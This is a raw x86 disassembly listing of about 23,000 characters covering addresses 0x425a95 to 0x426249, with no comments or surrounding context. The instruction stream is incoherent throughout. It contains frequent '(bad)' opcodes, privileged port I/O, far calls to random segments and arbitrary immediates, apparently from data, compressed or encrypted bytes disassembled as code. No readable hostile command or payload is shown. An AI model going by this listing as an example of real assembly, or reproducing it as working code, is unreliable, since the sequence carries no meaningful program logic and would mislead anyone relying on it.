  425a95:	jmp    0x425a1a
  425a97:	xchg   esi,eax
  425a98:	push   ebp
  425a99:	add    BYTE PTR [eax],al
  425a9b:	add    BYTE PTR [ebp+0x4f3707c0],cl
  425aa1:	idiv   DWORD PTR [ebp+0x532a00fa]
  425aa7:	fst    QWORD PTR [esi]
  425aa9:	pushf  
  425aaa:	push   cs
  425aab:	mov    edx,0x1d359
  425ab0:	test   DWORD PTR [edx],eax
  425ab2:	add    BYTE PTR [eax],al
  425ab4:	cmp    eax,0xee230abb
  425ab9:	stos   DWORD PTR es:[edi],eax
  425aba:	mov    edi,0xc469a577
  425abf:	sub    al,0x20
  425ac1:	aam    0x77
  425ac3:	loop   0x425a8d
  425ac5:	(bad)  
  425ac6:	call   FWORD PTR [ecx-0x7]
  425ac9:	inc    esi
  425aca:	xchg   edx,esi
  425acc:	and    esp,DWORD PTR [edi-0x22]
  425acf:	not    ebp
  425ad1:	loopne 0x425b4b
  425ad3:	xor    BYTE PTR [edi+ecx*1],ah
  425ad6:	pop    ecx
  425ad7:	cmp    cl,BYTE PTR [ebx-0x39]
  425ada:	push   ds
  425adb:	sbb    eax,0x374f51fb
  425ae0:	inc    edi
  425ae1:	daa    
  425ae2:	sti    
  425ae3:	sub    dh,BYTE PTR [edi]
  425ae5:	jne    0x425b46
  425ae7:	arpl   WORD PTR [ecx],dx
  425ae9:	mov    edi,DWORD PTR [eax-0x7b]
  425aec:	jge    0x425afd
  425aee:	addr16 fwait
  425af0:	call   0xdb8a:0x60d6ea6d
  425af7:	(bad)  
  425af8:	jb     0x425ab2
  425afa:	rcr    DWORD PTR [ecx+0x2ca30e5e],cl
  425b00:	aas    
  425b01:	sahf   
  425b02:	inc    esi
  425b03:	adc    ah,ah
  425b05:	mov    ecx,0x3fd53b95
  425b0a:	mov    ah,0x79
  425b0c:	aaa    
  425b0d:	sti    
  425b0e:	and    eax,0xf8fe8a8c
  425b13:	inc    esi
  425b14:	lahf   
  425b15:	outs   dx,BYTE PTR ds:[esi]
  425b16:	(bad)  
  425b17:	(bad)  
  425b18:	xchg   esp,eax
  425b19:	sbb    eax,eax
  425b1b:	inc    ebx
  425b1c:	inc    ecx
  425b1d:	xchg   esi,eax
  425b1e:	add    BYTE PTR [ebx+0x46],al
  425b21:	clc    
  425b22:	pop    edx
  425b23:	fistp  QWORD PTR [eax]
  425b25:	aas    
  425b26:	cmp    ch,dl
  425b28:	and    BYTE PTR [ebx+0x72],cl
  425b2b:	push   0xffffff94
  425b2d:	in     eax,0xbf
  425b2f:	call   0xf8adcc3f
  425b34:	add    eax,0x14fd6c4e
  425b39:	push   edi
  425b3a:	stos   DWORD PTR es:[edi],eax
  425b3b:	int    0x2b
  425b3d:	or     eax,0x596f2416
  425b42:	repnz pop ecx
  425b44:	push   esi
  425b45:	pop    ss
  425b46:	test   BYTE PTR [ebx+0x58893579],bh
  425b4c:	clc    
  425b4d:	retfw  
  425b4f:	mov    edx,0x84fa65d1
  425b54:	imul   edx,DWORD PTR [ebp+0x47],0x275857cf
  425b5b:	add    al,0xf5
  425b5d:	push   ds
  425b5e:	add    dh,dl
  425b60:	jno    0x425bb7
  425b62:	mov    WORD PTR [ebx+0x25],gs
  425b65:	sub    ebp,edi
  425b67:	sbb    edi,ebx
  425b69:	jns    0x425b9f
  425b6b:	shl    BYTE PTR [eax+ebx*2],1
  425b6e:	mov    ah,0x1c
  425b70:	push   esp
  425b71:	stos   DWORD PTR es:[edi],eax
  425b72:	or     ebx,esi
  425b74:	push   ds
  425b75:	sub    BYTE PTR [ebx-0x4b7de1ce],ch
  425b7b:	rol    DWORD PTR [edi+0x3b],0xaa
  425b7f:	test   dh,al
  425b81:	aas    
  425b82:	or     al,0x2e
  425b84:	into   
  425b85:	dec    ecx
  425b86:	sbb    al,0x91
  425b88:	jae    0x425b59
  425b8a:	inc    ebx
  425b8b:	mov    dh,0x8e
  425b8d:	or     eax,0x4ab94a84
  425b92:	xlat   BYTE PTR ds:[ebx]
  425b93:	leave  
  425b94:	dec    esi
  425b95:	mov    al,0xef
  425b97:	push   0x11476dd4
  425b9c:	mov    esi,0x753f089e
  425ba1:	and    al,0x8e
  425ba3:	mov    esi,0x3186396c
  425ba8:	push   0x38
  425baa:	pop    ss
  425bab:	enter  0xabff,0xdc
  425baf:	retf   
  425bb0:	shr    BYTE PTR [eax-0x25c7aba9],1
  425bb6:	imul   ecx,DWORD PTR [ebp+0x46d1e333],0x6a
  425bbd:	jns    0x425b66
  425bbf:	shl    ah,0x4d
  425bc2:	mov    fs,WORD PTR [ebp+0x46000cdf]
  425bc8:	jbe    0x425bd6
  425bca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425bcb:	mov    BYTE PTR [edx],al
  425bcd:	adc    BYTE PTR [ecx-0x5a34e5bc],dh
  425bd3:	sub    eax,0x38c52b41
  425bd8:	cmp    al,0xac
  425bda:	je     0x425be9
  425bdc:	sub    bh,al
  425bde:	mov    esp,0x97d2db5f
  425be3:	cdq    
  425be4:	imul   dh
  425be6:	mov    ds:0xc122dd70,al
  425beb:	cmp    esp,esp
  425bed:	fist   DWORD PTR [edi+0x44]
  425bf0:	xchg   edi,eax
  425bf1:	pop    esp
  425bf2:	xlat   BYTE PTR ds:[ebx]
  425bf3:	loope  0x425c31
  425bf5:	mov    DWORD PTR [ecx+eax*2+0x3ff4f9b8],0x603b25d5
  425c00:	push   ebx
  425c01:	push   ds
  425c02:	outs   dx,DWORD PTR ds:[esi]
  425c03:	xor    bl,al
  425c05:	push   ebp
  425c06:	loop   0x425b9a
  425c08:	mov    al,ds:0xca7a7c2b
  425c0d:	cmp    al,0x97
  425c0f:	xlat   BYTE PTR ds:[ebx]
  425c10:	stos   DWORD PTR es:[edi],eax
  425c11:	mov    ch,0x1
  425c13:	inc    esi
  425c14:	add    ah,cl
  425c16:	fst    QWORD PTR [ebx]
  425c18:	add    DWORD PTR [di],esi
  425c1b:	inc    ebp
  425c1c:	jb     0x425c3a
  425c1e:	test   BYTE PTR [edx],cl
  425c20:	inc    esi
  425c21:	cmc    
  425c22:	adc    eax,0x35398f2b
  425c27:	push   ebp
  425c28:	mov    ebp,DWORD PTR [edx]
  425c2a:	(bad)  
  425c2b:	sbb    eax,0x6118e435
  425c30:	jno    0x425c3c
  425c32:	div    bl
  425c34:	fstp   TBYTE PTR [esp+ebp*1-0x4a]
  425c38:	(bad)
  425c3b:	sbb    DWORD PTR [edi-0x49ad414d],0xffffff91
  425c42:	pop    eax
  425c43:	push   ss
  425c44:	(bad)
  425c47:	sar    DWORD PTR [edx],1
  425c49:	jmp    0x425c3b
  425c4b:	(bad)
  425c4e:	jecxz  0x425c5f
  425c50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c51:	sbb    ebp,DWORD PTR [edx]
  425c53:	add    al,0x8f
  425c55:	lods   eax,DWORD PTR ds:[esi]
  425c56:	add    DWORD PTR [ebx+0x37a0fb05],edi
  425c5c:	sbb    ebp,edx
  425c5e:	arpl   WORD PTR [ebx+0x74],ax
  425c61:	sbb    eax,0xfe4e06ab
  425c66:	add    edx,eax
  425c68:	outs   dx,DWORD PTR ds:[esi]
  425c69:	aam    0x97
  425c6b:	or     ch,bh
  425c6d:	fnstsw WORD PTR [ecx+0x28]
  425c70:	in     al,dx
  425c71:	mov    BYTE PTR [edi],ch
  425c73:	jle    0x425c1b
  425c75:	pop    edi
  425c76:	mov    ds:0x8057a325,al
  425c7b:	mov    ebx,0x8f18351
  425c80:	stos   BYTE PTR es:[edi],al
  425c81:	int    0xca
  425c83:	cmp    al,BYTE PTR [ebp-0x15a958be]
  425c89:	mov    al,ds:0x8a39cb08
  425c8e:	xchg   esi,eax
  425c8f:	jg     0x425c4d
  425c91:	or     BYTE PTR [edi-0x14],bl
  425c94:	inc    edi
  425c95:	ret    
  425c96:	dec    ebx
  425c97:	and    al,0x35
  425c99:	sbb    eax,0x4a1e38ff
  425c9e:	stos   DWORD PTR es:[edi],eax
  425c9f:	retf   0xa679
  425ca2:	sbb    BYTE PTR [esi-0x45b3ebe8],bl
  425ca8:	outs   dx,BYTE PTR ds:[esi]
  425ca9:	in     al,dx
  425caa:	sub    al,0x3e
  425cac:	or     ebp,DWORD PTR [ebx+0x6]
  425caf:	dec    esi
  425cb0:	inc    esp
  425cb1:	ret    0x605b
  425cb4:	outs   dx,BYTE PTR ds:[esi]
  425cb5:	inc    ebp
  425cb6:	retf   
  425cb7:	pop    edx
  425cb8:	rcr    DWORD PTR [edx+0x4c],0x34
  425cbc:	adc    eax,0x545881d6
  425cc1:	push   eax
  425cc2:	test   al,0x5
  425cc4:	out    dx,al
  425cc5:	xchg   esp,eax
  425cc6:	stc    
  425cc7:	jmp    0x425cec
  425cc9:	in     eax,0x51
  425ccb:	mov    ds:0x69e05028,eax
  425cd0:	pushf  
  425cd1:	lods   al,BYTE PTR ds:[esi]
  425cd2:	and    ch,BYTE PTR [edx+esi*2+0x29a73374]
  425cd9:	push   eax
  425cda:	mov    al,0xf1
  425cdc:	ror    bh,cl
  425cde:	add    DWORD PTR [esi-0x38],esp
  425ce1:	xor    eax,0x707d102e
  425ce6:	ins    BYTE PTR es:[edi],dx
  425ce7:	ret    0x3664
  425cea:	push   ds
  425ceb:	push   esp
  425cec:	mov    esi,0x4e2d4fe3
  425cf1:	mov    ds:0xfb5e7ddd,eax
  425cf6:	fcmove st,st(4)
  425cf8:	push   ss
  425cf9:	jmp    0xe27d:0x8c7eaee2
  425d00:	mov    DWORD PTR [ecx+0x3f07fcf2],esi
  425d06:	nop
  425d07:	mov    eax,gs:0xe33ba11a
  425d0d:	add    BYTE PTR [ebx+0x7d],ch
  425d10:	sbb    BYTE PTR [ebx+0x40],dh
  425d13:	ins    DWORD PTR es:[edi],dx
  425d14:	cli    
  425d15:	jnp    0x425d22
  425d17:	out    dx,al
  425d18:	xor    al,0x4e
  425d1a:	mov    dh,0x76
  425d1c:	test   eax,0x499d66e8
  425d21:	outs   dx,BYTE PTR es:[esi]
  425d23:	mov    edx,0x1a9784ed
  425d28:	adc    bh,BYTE PTR [edx-0x76a862c3]
  425d2e:	mov    ?,ebp
  425d30:	es add eax,0x9aaa59d2
  425d36:	cmp    ch,BYTE PTR [edx+0x13]
  425d3c:	mov    al,0x8a
  425d3e:	call   0xfa2657c4
  425d43:	mov    ebx,0x99242062
  425d48:	in     eax,0xec
  425d4a:	and    dh,dh
  425d4c:	(bad)  
  425d4e:	add    DWORD PTR [eax],eax
  425d50:	test   DWORD PTR [edx],eax
  425d52:	add    BYTE PTR [eax],al
  425d54:	mov    ebx,0x561693aa
  425d59:	push   cs
  425d5a:	and    BYTE PTR [edx+0x75050614],dl
  425d60:	jne    0x425d41
  425d62:	xor    ch,ah
  425d64:	sub    BYTE PTR [edi-0x46],bh
  425d67:	repnz pop ebx
  425d69:	xchg   edx,eax
  425d6a:	dec    di
  425d6c:	cmp    al,0x4a
  425d6e:	ffreep st(7)
  425d70:	in     al,0xba
  425d72:	loop   0x425dc5
  425d74:	and    ecx,DWORD PTR ds:[ebp*8+0x30fcc428]
  425d7c:	repz mov esp,0xeac74ecc
  425d82:	adc    bh,dh
  425d84:	rol    DWORD PTR [esi-0x51],0xf4
  425d88:	adc    eax,0x1f6fd46
  425d8d:	mov    al,ds:0xb0940bec
  425d92:	and    eax,0xa9cbf481
  425d97:	mov    ebp,0xeb92abfc
  425d9c:	mov    ds:0x3737e7b,eax
  425da1:	or     al,0x7a
  425da3:	mov    edx,ebx
  425da5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425da6:	sti    
  425da7:	bound  ebx,QWORD PTR [edx]
  425da9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425daa:	xor    bh,BYTE PTR [eax]
  425dac:	xchg   edi,eax
  425dad:	int    0xc4
  425daf:	bound  ecx,QWORD PTR [esp+ebp*1]
  425db2:	out    0xfc,al
  425db4:	sbb    edx,DWORD PTR [edi+0x16]
  425db7:	je     0x425dd4
  425db9:	xor    dl,dh
  425dbb:	mov    ah,BYTE PTR [eax]
  425dbd:	mov    ?,WORD PTR [eax+0x29]
  425dc0:	outs   dx,BYTE PTR ds:[esi]
  425dc1:	adc    bh,bh
  425dc3:	(bad)  
  425dc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425dc5:	out    dx,al
  425dc6:	retf   0xd01a
  425dc9:	je     0x425d69
  425dcb:	push   ss
  425dcc:	sbb    DWORD PTR [edi-0x63],eax
  425dcf:	imul   ebp,DWORD PTR [ebx-0x18],0xffffffad
  425dd3:	(bad)  
  425dd4:	shl    ebp,1
  425dd6:	mov    eax,edi
  425dd8:	jp     0x425d63
  425dda:	retf   0xbc33
  425ddd:	and    DWORD PTR [esi-0x15],0xffffffd9
  425de1:	xor    BYTE PTR ds:0xe0bc46a2,al
  425de7:	pop    eax
  425de8:	push   ds
  425de9:	nop
  425dea:	test   DWORD PTR [eax+0x18c76043],esi
  425df0:	inc    esi
  425df1:	fld    QWORD PTR fs:[edi]
  425df4:	mov    DWORD PTR [ecx],ebp
  425df6:	daa    
  425df7:	mov    esi,DWORD PTR [esi-0xb]
  425dfa:	xor    dh,ah
  425dfc:	mov    esi,0xae8b2c6a
  425e01:	std    
  425e02:	leave  
  425e03:	ror    DWORD PTR [ebx-0x2ca0c621],cl
  425e09:	ds mov bp,0x60e6
  425e0e:	push   esp
  425e0f:	leave  
  425e10:	add    eax,0xab41ddc1
  425e16:	icebp  
  425e17:	icebp  
  425e18:	test   eax,0x6a3c4582
  425e1d:	xchg   DWORD PTR [edi],eax
  425e1f:	int3   
  425e20:	loop   0x425e2b
  425e22:	or     BYTE PTR [esi-0x7c],cl
  425e25:	jbe    0x425e8f
  425e27:	in     eax,dx
  425e28:	repnz and edx,DWORD PTR [edx]
  425e2b:	call   0xcb1036a6
  425e30:	add    al,0x26
  425e32:	inc    ecx
  425e33:	pop    ecx
  425e34:	mov    ebp,edi
  425e36:	clc    
  425e37:	fsub   DWORD PTR [esi+ebx*8-0x76]
  425e3b:	inc    eax
  425e3c:	test   eax,0xc9c6f1c9
  425e41:	outs   dx,DWORD PTR ds:[esi]
  425e42:	xchg   ebx,eax
  425e43:	sbb    al,0x44
  425e45:	adc    DWORD PTR [ecx],edx
  425e47:	mov    ah,0x94
  425e49:	cdq    
  425e4a:	cdq    
  425e4b:	in     eax,0x77
  425e4d:	push   ecx
  425e4e:	jge    0x425e4c
  425e50:	das    
  425e51:	lock dec esp
  425e53:	push   ss
  425e54:	bound  edi,QWORD PTR [eax+0xed35c5b]
  425e5a:	push   ss
  425e5b:	inc    eax
  425e5c:	dec    ecx
  425e5d:	ret    0x59cb
  425e60:	leave  
  425e61:	aaa    
  425e62:	outs   dx,DWORD PTR ds:[esi]
  425e63:	ins    BYTE PTR es:[edi],dx
  425e64:	aas    
  425e65:	rcr    DWORD PTR [eax+0x1f],cl
  425e68:	push   ds
  425e69:	push   es
  425e6a:	cld    
  425e6b:	lock stc 
  425e6d:	(bad)  
  425e6e:	ret    
  425e6f:	mov    WORD PTR [ebx],?
  425e71:	fimul  DWORD PTR [edx-0x72]
  425e74:	sbb    DWORD PTR [ecx+eiz*8+0x63],eax
  425e78:	push   esp
  425e79:	xor    esp,esp
  425e7b:	xor    BYTE PTR [edi+0x746254c3],dl
  425e81:	push   edx
  425e82:	mov    dh,0xe
  425e84:	and    esp,DWORD PTR ds:0xfe9070f9
  425e8a:	mov    bl,0x86
  425e8c:	es jmp 0xe54c:0xcc9be964
  425e94:	cwde   
  425e95:	pop    DWORD PTR [ebx-0x77f8b063]
  425e9b:	clc    
  425e9c:	cs loopne 0x425ef3
  425e9f:	adc    edx,esi
  425ea1:	imul   ecx,edx,0xe49fe899
  425ea7:	jle    0x425e5b
  425ea9:	push   es
  425eaa:	out    dx,eax
  425eab:	mov    edi,0xf41f40d4
  425eb0:	cmp    al,0xc4
  425eb2:	push   esi
  425eb3:	popf   
  425eb4:	dec    ebp
  425eb5:	ss sbb al,0x42
  425eb8:	loop   0x425f34
  425eba:	and    dl,BYTE PTR [eax]
  425ebc:	mov    dl,0xf6
  425ebe:	dec    esi
  425ebf:	xchg   ebp,eax
  425ec0:	jge    0x425f24
  425ec2:	aam    0xc0
  425ec4:	loopne 0x425ea3
  425ec6:	or     ecx,DWORD PTR [ebp+0x7f]
  425ec9:	shl    BYTE PTR [ebp+0x2525151b],1
  425ecf:	sub    cl,BYTE PTR [bx]
  425ed2:	popf   
  425ed3:	mov    eax,0x176bbdeb
  425ed8:	test   eax,0x132559a0
  425edd:	inc    edi
  425ede:	adc    BYTE PTR [edx-0x55],ch
  425ee1:	jns    0x425e79
  425ee3:	push   ecx
  425ee4:	mov    ch,0x44
  425ee6:	sbb    bh,BYTE PTR [ecx+0x73d6fe65]
  425eec:	adc    DWORD PTR [edi-0x4b29d0ad],ecx
  425ef2:	mov    edx,0x1bc68ebe
  425ef7:	hlt    
  425ef8:	add    BYTE PTR [ebx-0x3e],ah
  425efb:	cmp    ebx,esi
  425efd:	dec    ebp
  425efe:	mov    WORD PTR [esi+0x6c],?
  425f01:	inc    ebx
  425f02:	(bad)  
  425f04:	(bad)  
  425f05:	xor    bl,BYTE PTR [ebp-0x11]
  425f08:	popa   
  425f09:	adc    DWORD PTR [edi],edi
  425f0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f0c:	mov    edi,0xdffd657b
  425f11:	push   eax
  425f12:	ret    0xe096
  425f15:	adc    DWORD PTR [edx],0x2
  425f18:	outs   dx,DWORD PTR ds:[esi]
  425f19:	adc    DWORD PTR [ebx],edi
  425f1b:	mov    edi,0x8acca384
  425f20:	mov    cl,0xe5
  425f22:	mov    dl,0xc0
  425f24:	xlat   BYTE PTR ds:[ebx]
  425f25:	inc    ebx
  425f26:	fld    QWORD PTR [edx-0xbcdb370]
  425f2c:	add    ah,BYTE PTR [ebx]
  425f2e:	inc    esp
  425f2f:	push   es
  425f30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f31:	dec    ecx
  425f32:	inc    ebx
  425f33:	pop    ebx
  425f34:	mov    ebx,0xaa3f95f4
  425f39:	pusha  
  425f3a:	or     al,0x4c
  425f3c:	jbe    0x425f7b
  425f3e:	push   es
  425f3f:	sub    edx,DWORD PTR [esi+0x54]
  425f42:	lahf   
  425f43:	cmp    ah,BYTE PTR [ecx]
  425f45:	sub    DWORD PTR [edx-0x825a5f],ebx
  425f4b:	add    ebp,DWORD PTR [eax-0x18]
  425f4e:	aad    0x3b
  425f50:	mov    ds:0xd73a0369,eax
  425f55:	inc    edi
  425f56:	xor    al,0x46
  425f58:	jb     0x425f99
  425f5a:	(bad)  
  425f5c:	scas   al,BYTE PTR es:[edi]
  425f5d:	xor    eax,0x806f257a
  425f62:	jecxz  0x425fa4
  425f64:	rol    BYTE PTR [edx-0x78e7c824],cl
  425f6a:	sahf   
  425f6b:	push   ebp
  425f6c:	dec    edi
  425f6d:	cwde   
  425f6e:	push   edi
  425f6f:	pop    ebp
  425f70:	scas   al,BYTE PTR es:[edi]
  425f71:	loop   0x425f9a
  425f73:	cwde   
  425f74:	js     0x425feb
  425f76:	shr    BYTE PTR [eax+0xf5bc963],cl
  425f7c:	push   0xb86b33e1
  425f81:	sti    
  425f82:	jbe    0x425fb5
  425f84:	and    DWORD PTR [edx-0x58c509e3],esp
  425f8a:	or     dl,BYTE PTR [esi]
  425f8c:	popf   
  425f8d:	pushf  
  425f8e:	das    
  425f8f:	inc    esp
  425f90:	cmc    
  425f91:	in     al,dx
  425f92:	mov    BYTE PTR [esp+edi*1+0x73290cee],ah
  425f99:	xor    al,0x6d
  425f9b:	push   ebx
  425f9c:	adc    edi,DWORD PTR [ecx]
  425f9e:	jp     0x425f37
  425fa0:	xchg   ebp,eax
  425fa1:	mov    al,0xc9
  425fa3:	in     al,0xc2
  425fa5:	and    al,0x81
  425fa7:	and    edx,esp
  425fa9:	add    al,0x60
  425fab:	mov    esp,0x86b99b1b
  425fb0:	sahf   
  425fb1:	mov    ebx,edx
  425fb3:	sbb    al,0xaf
  425fb5:	xor    DWORD PTR [ecx-0x1099e11f],ebx
  425fbb:	mov    gs,ebp
  425fbd:	gs mov ebx,0x43c842b8
  425fc3:	sub    dl,BYTE PTR [esi+0x6f]
  425fc6:	mov    esp,0x56db42fc
  425fcb:	and    esi,DWORD PTR [edi]
  425fcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425fce:	push   edx
  425fcf:	sub    eax,0x78968bc5
  425fd4:	inc    edi
  425fd5:	pop    esi
  425fd6:	mov    ebp,0xccb8
  425fdb:	add    BYTE PTR [edx-0x39253b74],cl
  425fe1:	ficomp DWORD PTR [esi+0x2983e7dc]
  425fe7:	mov    WORD PTR [edx-0x68],cs
  425fea:	add    eax,0x1d863f9
  425fef:	add    BYTE PTR [ebp+0x2f000002],al
  425ff5:	mov    ebx,0xf5bb399c
  425ffa:	gs jl  0x426051
  425ffd:	mov    ch,0x61
  425fff:	shl    BYTE PTR [eax],0x15
  426002:	fmulp  st(0),st
  426004:	pop    es
  426005:	rcl    DWORD PTR [edi+0x6],0xe9
  426009:	ret    
  42600a:	and    BYTE PTR [eax-0x4f083de2],dl
  426010:	pop    ds
  426011:	xchg   BYTE PTR [esp+ebx*8],dh
  426014:	add    bl,cl
  426016:	add    ch,dl
  426018:	in     al,dx
  426019:	ret    
  42601a:	pop    ecx
  42601b:	push   es
  42601c:	mov    dl,bl
  42601e:	je     0x426058
  426020:	or     BYTE PTR [edi],cl
  426022:	push   ds
  426023:	out    0xce,al
  426025:	out    0x3a,al
  426027:	in     al,0x1e
  426029:	sub    DWORD PTR [ecx],0xffffffae
  42602c:	ja     0x425ff1
  42602e:	out    dx,al
  42602f:	pop    eax
  426030:	push   ss
  426031:	enter  0xaaa8,0xc8
  426035:	jns    0x425ff7
  426037:	dec    eax
  426038:	inc    eax
  426039:	adc    BYTE PTR [esp+ebp*1-0x7c3c1ed2],0xb0
  426041:	mov    ds:0x71241c45,al
  426046:	xchg   edx,eax
  426047:	inc    edi
  426048:	(bad)  
  426049:	(bad)  
  42604a:	jo     0x42608f
  42604c:	cmp    eax,0x4c87059c
  426051:	loop   0x426075
  426053:	icebp  
  426054:	repz aas 
  426056:	mul    BYTE PTR [ecx+0x5aa55c2b]
  42605c:	test   DWORD PTR ds:0xc078d53e,0x44724e15
  426066:	das    
  426067:	vrsqrtss xmm4,xmm0,DWORD PTR [eax+0x46]
  42606c:	sbb    al,0x52
  42606e:	inc    ebp
  42606f:	add    BYTE PTR [eax-0x52],dh
  426072:	inc    esp
  426073:	rol    BYTE PTR [esi+eax*2+0x31],cl
  426077:	je     0x4260e1
  426079:	stos   DWORD PTR es:[edi],eax
  42607a:	in     eax,dx
  42607b:	inc    eax
  42607c:	pop    ebp
  42607d:	dec    eax
  42607e:	cmp    edx,eax
  426080:	je     0x426084
  426082:	push   edx
  426083:	push   esp
  426084:	ss icebp 
  426086:	and    eax,0x90b25d54
  42608b:	push   esp
  42608c:	jl     0x42600f
  42608e:	pusha  
  42608f:	sti    
  426090:	xor    cl,BYTE PTR [eax-0x1644e9af]
  426096:	pop    esi
  426097:	or     edx,0x562cf030
  42609d:	or     DWORD PTR [edx-0x6],ebx
  4260a0:	mov    ecx,ds
  4260a2:	xor    DWORD PTR [ebx-0x2f9615a2],ecx
  4260a8:	retf   0x2d9c
  4260ab:	and    dl,dh
  4260ad:	mulps  xmm2,xmm7
  4260b0:	test   esp,ebx
  4260b2:	shl    DWORD PTR [ebx],1
  4260b4:	sbb    eax,0xfc4d82c9
  4260b9:	push   edx
  4260ba:	je     0x4260c3
  4260bc:	jno    0x426135
  4260be:	sbb    dl,BYTE PTR [ebx+0x62]
  4260c1:	sahf   
  4260c2:	mov    ch,0xfa
  4260c4:	shr    ch,1
  4260c6:	mov    ds:0xdf963d07,al
  4260cb:	aas    
  4260cc:	outs   dx,DWORD PTR ds:[esi]
  4260cd:	add    al,0x82
  4260cf:	popa   
  4260d0:	jbe    0x4260f1
  4260d2:	mov    edx,0x934318f3
  4260d7:	leave  
  4260d8:	cdq    
  4260d9:	jno    0x426104
  4260db:	jo     0x426145
  4260dd:	into   
  4260de:	test   al,0xb9
  4260e0:	xchg   esi,eax
  4260e1:	je     0x426137
  4260e3:	leave  
  4260e4:	in     al,dx
  4260e5:	dec    ebp
  4260e6:	mov    eax,0xd2724fb3
  4260eb:	adc    eax,0xfa0fb0b3
  4260f0:	xchg   esi,eax
  4260f1:	(bad)  
  4260f2:	adc    bl,BYTE PTR [ecx-0x471ce595]
  4260f8:	dec    ebp
  4260f9:	sbb    eax,0xdc4596d8
  4260fe:	mov    ebx,db1
  426101:	or     eax,0x303518ef
  426106:	scas   eax,DWORD PTR es:[edi]
  426107:	out    dx,al
  426108:	cld    
  426109:	xor    ah,BYTE PTR [ecx-0xe]
  42610c:	dec    ebp
  42610d:	(bad)  
  42610e:	adc    eax,0x2c787d5f
  426113:	imul   ecx,DWORD PTR [ebp-0x19],0x2df17204
  42611a:	jno    0x4260c1
  42611c:	xor    al,0xd7
  42611e:	sbb    al,0x4c
  426120:	dec    esp
  426121:	aaa    
  426122:	outs   dx,BYTE PTR ds:[esi]
  426123:	adc    DWORD PTR [ebx-0x623c4f05],edx
  426129:	sbb    cl,BYTE PTR [eax]
  42612b:	mov    esi,eax
  42612d:	ret    0x590d
  426130:	pusha  
  426131:	call   edi
  426133:	fucomip st,st(1)
  426135:	cmp    BYTE PTR [ebp-0x27923e84],ch
  42613b:	add    eax,0xec5d3f4
  426140:	call   FWORD PTR [eax-0x61]
  426143:	cmp    edi,DWORD PTR gs:[edx-0x3d]
  426147:	mov    ebx,0x99786c75
  42614c:	aas    
  42614d:	xchg   edi,eax
  42614e:	and    edx,DWORD PTR [ecx+0x7930f94f]
  426154:	jae    0x426127
  426156:	or     BYTE PTR [eax],ah
  426158:	into   
  426159:	stos   DWORD PTR es:[edi],eax
  42615a:	inc    esp
  42615b:	dec    eax
  42615c:	rcl    DWORD PTR [edx-0x3eeb6f1e],1
  426162:	and    eax,0x38fe92ef
  426167:	pop    edx
  426168:	adc    eax,0x96c587f8
  42616d:	pop    ecx
  42616e:	sbb    ecx,ebp
  426170:	fdivr  DWORD PTR [ebp+0x69b2d614]
  426176:	test   DWORD PTR [edi],ebx
  426178:	clc    
  426179:	pop    edi
  42617a:	xchg   ebx,eax
  42617b:	cwde   
  42617c:	fist   WORD PTR [edi-0x18]
  42617f:	adc    al,0xc7
  426181:	xchg   ecx,eax
  426182:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426183:	call   0x166ca1c1
  426188:	push   esp
  426189:	mov    edx,gs
  42618b:	std    
  42618c:	mov    al,0x3d
  42618e:	retf   
  42618f:	pop    es
  426190:	mov    ebp,?
  426192:	or     BYTE PTR [esp+edx*1],al
  426195:	in     al,0xe3
  426197:	dec    eax
  426198:	fimul  WORD PTR gs:[eax+0x113b395d]
  42619f:	lock mov edx,DWORD PTR [edi]
  4261a2:	pop    esp
  4261a3:	mov    DWORD PTR [ebp-0x1a],edx
  4261a6:	mov    esp,0x9ccc5b88
  4261ab:	push   edi
  4261ac:	mov    dl,0xd4
  4261ae:	dec    ecx
  4261af:	out    dx,al
  4261b0:	xor    eax,0xa29ffe7e
  4261b5:	xchg   edx,eax
  4261b6:	mov    DWORD PTR [esi-0xe6de2f4],ebp
  4261bc:	push   eax
  4261bd:	mov    al,ds:0xd53f88d1
  4261c2:	shl    DWORD PTR [ebp+0x38],0xb5
  4261c6:	sbb    ebp,DWORD PTR [edx-0x29f6cab4]
  4261cc:	retf   0x4e6e
  4261cf:	pop    ebx
  4261d0:	inc    esi
  4261d1:	xchg   esp,eax
  4261d2:	jb     0x426197
  4261d4:	arpl   WORD PTR [edx-0x3b],bx
  4261d7:	push   0x17
  4261d9:	pushf  
  4261da:	ins    DWORD PTR es:[edi],dx
  4261db:	dec    cl
  4261dd:	int    0x92
  4261df:	jge    0x42622b
  4261e1:	inc    edi
  4261e2:	fiadd  WORD PTR [esi+ecx*8]
  4261e5:	xchg   DWORD PTR gs:[edx],ebp
  4261e8:	add    ch,BYTE PTR [esi+0x3a8c580a]
  4261ee:	clc    
  4261ef:	dec    esi
  4261f0:	jbe    0x4261c1
  4261f2:	retf   0xa562
  4261f5:	daa    
  4261f6:	sbb    al,0xbb
  4261f8:	pop    ss
  4261f9:	pop    es
  4261fa:	push   ss
  4261fb:	pop    edi
  4261fc:	icebp  
  4261fd:	popf   
  4261fe:	xor    dl,BYTE PTR [esi]
  426200:	and    eax,0xd2b3aa42
  426205:	and    DWORD PTR [ebx],eax
  426207:	adc    BYTE PTR [eax+0x51],ch
  42620a:	mov    ah,0xe9
  42620c:	mov    BYTE PTR [esi+0x36995aa9],cl
  426212:	test   WORD PTR [esi+eax*2],bp
  426216:	lods   eax,DWORD PTR ds:[esi]
  426217:	xchg   BYTE PTR [ebx],bh
  426219:	inc    edx
  42621a:	mov    al,ds:0xd90b0809
  42621f:	shr    DWORD PTR ds:0x9940e033,cl
  426225:	jle    0x42625d
  426227:	repnz daa 
  426229:	sub    bl,dh
  42622b:	sar    DWORD PTR [esi-0x41],cl
  42622e:	enter  0x8d32,0x75
  426232:	mov    ds:0xbcd92fea,al
  426237:	mov    ch,0xc7
  426239:	mov    ebx,0x9a7d9eab
  42623e:	jge    0x4261cf
  426240:	hlt    
  426241:	pop    edx
  426242:	sahf   
  426243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426244:	out    dx,eax
  426245:	push   ds
  426246:	xor    DWORD PTR [esi-0x25],edx
  426249:	fmul   DWORD PTR [edx]
